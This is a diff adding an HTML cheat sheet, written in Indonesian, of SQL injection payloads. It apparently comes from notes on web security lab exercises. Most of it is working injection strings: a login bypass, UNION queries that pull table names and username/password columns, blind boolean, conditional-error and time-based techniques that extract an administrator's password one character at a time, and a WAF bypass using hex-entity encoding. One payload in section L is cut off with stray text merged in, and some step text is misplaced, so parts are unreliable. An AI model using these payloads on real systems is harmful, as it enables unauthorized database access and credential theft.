@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SQLI</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <h1>SQL Injection</h1>
+    <h3>Regular SQL Injection</h3>
+    <section>
+      <p><b>A. Menampilkan semua data</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Ubah parameternya di URL menjadi:
+          <div class="demo">shop?category=shoes'+OR+1=1--</div>
+        </li>
+        <li>Maka semua kategori yang belum rilis akan ter-fetch</li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>B. Bypass login</b></p>
+      <ol>
+        <li>Temukan form login</li>
+        <li>
+          Ubah usernmae menjadi:
+          <div class="demo">admin'--</div>
+        </li>
+      </ol>
+    </section>
+
+    <h3>UNION SQL Injection</h3>
+
+    <section>
+      <p><b>C. Ekstrak tipe dan versi database (oracle)</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Ubah parameternya menjadi untuk:
+          <div class="demo">'+UNION+SELECT+null,null+FROM+dual--</div>
+        </li>
+        <li>
+          Untuk mendapatkan versi database, ubah menjadi:
+          <div class="demo">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</div>
+        </li>
+        <li>Maka akan langsung login</li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>D. Ekstrak tipe dan versi database (MySQL and MSSQL)</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Ubah parameternya menjadi untuk:
+          <div class="demo">'+UNION+SELECT+null,null#</div>
+        </li>
+        <li>
+          Untuk mendapatkan versi database, ubah menjadi:
+          <div class="demo">'+UNION+SELECT+@@version,+NULL#</div>
+        </li>
+        <li>Maka akan langsung login</li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>E. Ekstrak jumlah kolom dan isi table (non Oracle)</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Ubah parameternya menjadi:
+          <div class="demo">'+UNION+SELECT+null,null--</div>
+        </li>
+        <li>
+          Untuk mendapatkan nama table, ubah menjadi:
+          <div class="demo">
+            '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+          </div>
+        </li>
+        <li>
+          Untuk mendapatkan nama kolom, ubah menjadi:
+          <div class="demo">
+            '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+          </div>
+        </li>
+        <li>
+          Dapatkan username dan password-nya, ubah menjadi:
+          <div class="demo">
+            '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>F. Ekstrak jumlah kolom dan isi table (Oracle)</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Ubah parameternya menjadi:
+          <div class="demo">'+UNION+SELECT+null,null+FROM+dual--</div>
+        </li>
+        <li>
+          Untuk mendapatkan nama table, ubah menjadi:
+          <div class="demo">
+            '+UNION+SELECT+table_name,NULL+FROM+all_tables--
+          </div>
+        </li>
+        <li>
+          Untuk mendapatkan nama kolom, ubah menjadi:
+          <div class="demo">
+            '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+          </div>
+        </li>
+        <li>
+          Dapatkan username dan password-nya, ubah menjadi:
+          <div class="demo">
+            '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>G. Menghitung jumlah kolom</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Ubah parameternya menjadi:
+          <div class="demo">'+UNION+SELECT+NULL--</div>
+          perhatikan error yang muncul. Tambah terus null nya sampai errornya
+          hilang
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>H. Menentukan tipe kolom teks</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Ubah parameternya menjadi:
+          <div class="demo">'+UNION+SELECT+NULL--</div>
+          perhatikan error yang muncul. Tambah terus null nya sampai errornya
+          hilang
+        </li>
+        <li>
+          Ganti null satu persatu dengan teks seperti berikut:
+          <div class="demo">'+UNION+SELECT+'abcdef',NULL,NULL--</div>
+          Jika error, pindahlah ke null berikutnya
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>I. Mendapatkan data dari table lain</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Lakukan penghitungan jumlah kolom dan tipe data seperti cara di atas:
+          <div class="demo">'+UNION+SELECT+NULL--</div>
+        </li>
+        <li>
+          Query ke table lain dengan kolom yang sesuai tipe data kolom saat ini:
+          <div class="demo">'+UNION+SELECT+username,+password+FROM+users--</div>
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>J. Mendapatkan multiple data dalam single column</b></p>
+      <ol>
+        <li>Temukan URL berparameter</li>
+        <li>
+          Lakukan penghitungan jumlah kolom dan tipe data seperti cara di atas:
+          <div class="demo">'+UNION+SELECT+NULL--</div>
+        </li>
+        <li>
+          Query ke table lain dengan kolom yang sesuai tipe data kolom saat ini:
+          <div class="demo">
+            '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <h3>Blind SQL Injection</h3>
+
+    <section>
+      <p><b>K. Ekstrak password orang lain</b></p>
+      <ol>
+        <li>
+          Misalnya ada web menggunakan cookie: trackingId, ubah menjadi:
+          <div class="demo">TrackingId=xyz' AND '1'='1</div>
+          Seharusnya tampilannya tetap sama
+        </li>
+        <li>
+          Lalu ubah menjadi:
+          <div class="demo">TrackingId=xyz' AND '1'='2</div>
+          Pastikan ada tampilan yang berbeda
+        </li>
+        <li>
+          Untuk memastikan table users ada, ubah menjadi:
+          <div class="demo">
+            TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+          </div>
+        </li>
+        <li>
+          Untuk memastikan username 'administrator' ada, ubah menjadi:
+          <div class="demo">
+            TrackingId=xyz' AND (SELECT 'a' FROM users WHERE
+            username='administrator')='a
+          </div>
+        </li>
+        <li>
+          Cek panjang password adminnya, ubah menjadi:
+          <div class="demo">
+            TrackingId=xyz' AND (SELECT 'a' FROM users WHERE
+            username='administrator' AND LENGTH(password)>1)='a
+          </div>
+          tambah terus angka 1 nya sampai tidak terjadi error
+          <div class="demo">
+            TrackingId=xyz' AND (SELECT 'a' FROM users WHERE
+            username='administrator' AND LENGTH(password)>10)='a
+          </div>
+        </li>
+        <li>
+          Setelah mengetahui panjang passwordnya, kita cek huruf pertama
+          passwodnya menggunakan SUBSTRING(), gunakanlah burp intruder:
+          <div class="demo">
+            TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE
+            username='administrator')='a
+          </div>
+          <p>
+            Gunakan payload simple list dan isi payloadnya dengan range a-z 0-8.
+            Add payload pada huruf 'a'
+          </p>
+          kalau tidak error, berarti hurufnya benar.
+          <div class="demo">
+            TrackingId=xyz' AND (SELECT 'a' FROM users WHERE
+            username='administrator' AND LENGTH(password)>10)='a
+          </div>
+        </li>
+        <li>
+          Lanjutkan ke posisi kedua dan seterusnya:
+          <div class="demo">
+            TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE
+            username='administrator')='a
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>K. Blind SQLI dengan conditional error (Oracle)</b></p>
+      <ol>
+        <li>
+          Ubah cookie menjadi:
+          <div class="demo">TrackingId=xyz'</div>
+          Pastikan muncul error. Lalu coba ubah menjadi:
+          <div class="demo">TrackingId=xyz''</div>
+          Pastikan tidak error untuk memastikan bahwa errornya disebabkan
+          kesalahan SQL
+        </li>
+        <li>
+          Pastikan errornya benar-benar karena SQL. Gsntilah dengan subquery
+          berikut:
+          <div class="demo">TrackingId=xyz'||(SELECT '')||'</div>
+          Pastikan error
+        </li>
+        <li>
+          Cobalah memprediksi nama table dengan:
+          <div class="demo">TrackingId=xyz'||(SELECT '' FROM dual)||'</div>
+          Pastikan tidak error. Cobalah mencari table yang tidak ada:
+          <div class="demo">
+            TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
+          </div>
+          Pastikan error
+        </li>
+        <li>
+          Kita bisa gunakan untuk mengecek apakah suatu table ada atau tidak,
+          misalnya mengecek apakah table users ada:
+          <div class="demo">
+            TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+          </div>
+        </li>
+        <li>
+          Misalnya mengecek username 'administrator'
+          <div class="demo">
+            TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ''
+            END FROM users WHERE username='administrator')||'
+          </div>
+          jika error berarti ada
+        </li>
+        <li>
+          Lanjut cari tahu panjang passwordnya:
+          <div class="demo">
+            TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN
+            to_char(1/0) ELSE '' END FROM users WHERE
+            username='administrator')||'
+          </div>
+          Jika error berarti lebih dari 1
+        </li>
+        <li>
+          Lanjut tebak huruf per password-nya, gunakanlah burp intruder:
+          <div class="demo">
+            TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN
+            TO_CHAR(1/0) ELSE '' END FROM users WHERE
+            username='administrator')||'
+          </div>
+          Jika error berarti benar
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>L. Visible error-based SQLI (Pesan error yang mengembalikan data)</b></p>
+      <ol>
+        <li>
+          Cek apakah vulner:
+          <div class="demo">TrackingId=xyz'</div>
+          Pastikan muncul error. Lalu coba ubah menjadi:
+        </li>
+        <li>
+          Cobalah query berikut:
+          <div class="demo">TrackingId=ogAZZfxtOKUELbuJ'--</div>
+          Pastikan errornya hilang
+        </li>
+        <li>
+          Cobalah enumerate username 'administrator'
+          <div class="demo">TrackingId=' AND 1=CAST((SELECT Pesan error akan muncul seperti ini: invalid input syntax for type integer: "administrator"
+        </li>
+        <li>
+          Lalu enumerate passwodnya:
+          <div class="demo">
+            TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>M. Blind SQLI via time delays</b></p>
+      <ol>
+        <li>Ubah cookie trackingId menjadi:
+          <div class="demo">TrackingId=x'||pg_sleep(10)--</div>
+          Maka akan terjadi delay 10 detik
+        </li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>N. Ekstrak data via time-based SQLI (PGSQL)</b></p>
+      <ol>
+        <li>Pastikan vulner dengan mengubah cookie-nya menjadi:
+          <div class="demo">TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</div>
+          Jika vulner maka akan delay 10 detik
+        </li>
+        <li>
+          Ubah lagi seperti ini:
+          <div class="demo">TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</div>
+          Pastikan tidak vulner
+        </li>
+        <li>
+          Cek apakah username 'administrator' ada:
+          <div class="demo">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</div>
+          Jika ada maka akan delay
+        </li>
+        <li>
+          Cek panjang passwodnya:
+          <div class="demo">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</div>
+          Lakukan terus sampai delay:
+          <div class="demo">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</div>
+        </li>
+        <li>
+          Gunakan burp intruder untuk mengecek huruf pertama passwodnya:
+          <div class="demo">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</div>
+          Pastikan intruder dalam mode single thread, caranya pergi ke tab resource pool lalu set Maximum concurrent requests menjadi 1
+        </li>
+        <li>Setelah attack selesai, cek received response tab dan carilah yang 10.000 ms</li>
+        <li>Lakukan hal tadi pada posisi berikutnya</li>
+      </ol>
+    </section>
+
+    <section>
+      <p><b>O. Bypass WAF via XML encoding SQLI</b></p>
+      <ol>
+        <li>Cek bahwa request WHERE yang kita kirim dikirim dalam format XML</li>
+        <li>Pada <id>1</id> misalnya kita sisipkan UNION:
+          <div class="demo">< id >1 UNION SELECT NULL</ id ></div>
+        </li>
+        <li>Download extension hackvektor. Highlight payloadnya, klik kanan, lalu pilih Extensions > Hackvertor > Encode > dec_entities/hex_entities. Lalu kirim</li>
+        <li>Jika hanya bisa memilih satu kolom, maka gunakanlah:
+          <div class="demo"><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></div>
+        </li>
+      </ol>
+    </section>
+  </body>
+</html>
